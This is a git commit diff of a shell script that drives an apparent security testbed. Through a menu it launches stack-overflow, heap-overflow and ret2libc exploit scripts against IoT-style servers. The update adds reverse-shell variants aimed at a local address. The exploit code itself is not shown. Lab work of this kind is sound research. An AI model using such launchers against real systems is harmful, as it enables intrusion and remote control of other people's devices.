6e52905aa132d96a80d539dc48d41ab79fe2f32c
salahuddin975 <salahuddin975@gmail.com>
2020-03-27 02:37:57 +0000

    Update client script for the testbed.

--- client.sh
+++ client.sh
@@ -4,36 +4,51 @@ Attack()
 	do
 		echo ""
 		echo "Please choose a particular attack..."
-        	echo "	Stack Overflow --> 1"
-        	echo "	Heap Overflow --> 2"
-        	echo "	Ret-to-libc --> 3"
-		echo "	Select new server --> 4"
+        	echo "	Stack overflow --> 1"
+        	echo "	Ret2libc --> 2"
+        	echo "	Heap overflow --> 3"
+		echo "	Stack overflow (reverse shell) --> 4"
+		echo "	Ret2libc (reverse shell) --> 5"
+		echo "	Heap Overflow (reverse shell) --> 6"
+		echo "	Select new server --> 7"
 
        		read input
         	case $input in
                 	1) 
-                        	$1 localhost 5555
+                        	$1/so.py localhost 5555
                        		;;
                		2) 
-                       		./ho.py
+                       		$1/ret_2_libc.py localhost 5555
                        		;;
                		3) 
-                       		./r2lc.py
+                       		$1/ho.py localhost 5555
                       		;;
 			4)
+				$1/so_rev.py "192.168.1.4" 5555
+				;;
+			5)
+				$1/ret2libc_rev.py "192.168.1.4" 5555
+				;;
+			6)	
+				$1/ho_rev.py "192.168.1.4" 5555
+				;;
+
+			7)
 				return
 				;;
                		*) 
-                       		echo "	Please enter a valid option"
-               	        	echo "	Stack Overflow --> 1"
-                       		echo "	Heap Overflow --> 2"
-                       		echo "	Ret-to-libc --> 3"
+		                echo "Please choose a particular attack..."
+                		echo "  Stack overflow --> 1"
+		                echo "  Ret2libc --> 2"
+        		        echo "  Heap overflow --> 3"
+                		echo "  Stack overflow (reverse shell) --> 4"
+		                echo "  Ret2libc (reverse shell) --> 5"
+        	        	echo "  Heap Overflow (reverse shell) --> 6"
+                		echo "  Select new server --> 7"
                        		;;
        		esac
 	done
 }
-
-
 
 
 
@@ -44,22 +59,26 @@ do
         echo "	Smart Home --> 2"
 	echo "	Remote Control Car Monitor --> 3"
 	echo "	DNS server --> 4"
+	echo "	exit from program -> 5"
 
 	read program
 	case $program in
 		1)
-			Attack ./IrrigationServer/so.py 
+			Attack ./IrrigationServer 
 			;;
 
 		2)
-                	Attack ./smarthome/so.py
+                	Attack ./smarthome
                 	;;
 		
 		3)
-                	Attack ./remote-control-monitor-car-server/src/so.py
+                	Attack ./remote-control-monitor-car-server/src
                 	;;
 		4)
-			Attack ./DNS_server_raspberrypi/so.py
+			Attack ./DNS_server_raspberrypi
+			;;
+		5)
+			exit 1
 			;;
 
 	esac
